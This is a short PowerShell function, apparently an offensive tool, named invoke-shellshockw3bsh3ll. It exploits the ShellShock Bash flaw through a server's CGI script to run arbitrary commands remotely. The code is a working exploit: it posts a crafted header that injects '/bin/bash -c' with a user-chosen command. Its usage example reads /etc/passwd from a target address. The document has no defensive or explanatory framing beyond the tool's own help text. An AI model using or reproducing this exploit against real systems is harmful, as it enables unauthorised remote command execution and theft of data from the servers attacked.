function invoke-shellshockw3bsh3ll {
<#



.SYNOPSIS
This is a scipt that can help you remotely execute commands using CGI and ShellShock
.DESCRIPTION
┬┌┐┌┬  ┬┌─┐┬┌─┌─┐  ┌─┐┬ ┬┌─┐┬  ┬  ┌─┐┬ ┬┌─┐┌─┐┬┌─┬ ┬┌┐ ┌─┐┬ ┬┬  ┬  
││││└┐┌┘│ │├┴┐├┤───└─┐├─┤├┤ │  │  └─┐├─┤│ ││  ├┴┐│││├┴┐└─┐├─┤│  │  
┴┘└┘ └┘ └─┘┴ ┴└─┘  └─┘┴ ┴└─┘┴─┘┴─┘└─┘┴ ┴└─┘└─┘┴ ┴└┴┘└─┘└─┘┴ ┴┴─┘┴─┘
Locate a CGI bin on the server. Example /cgi-bin/status. This location is where we will post our custom headers to execute our command.

.EXAMPLE
exploit-shellshock -URL "http://192.168.239.134/cgi-bin/status" -CMD "cat /etc/passwd"

.NOTES
All commands must be enclosed in quotes. Commands are executed from the BASH shell. 

#>
param( $URL, $CMD )
$output = invoke-webrequest -Uri $URL -Headers @{"custom"="() { ignored; };echo Content-Type: text/html; echo ; /bin/bash -c ""$CMD"" "} -Method post
$output = $output.content
return $output
}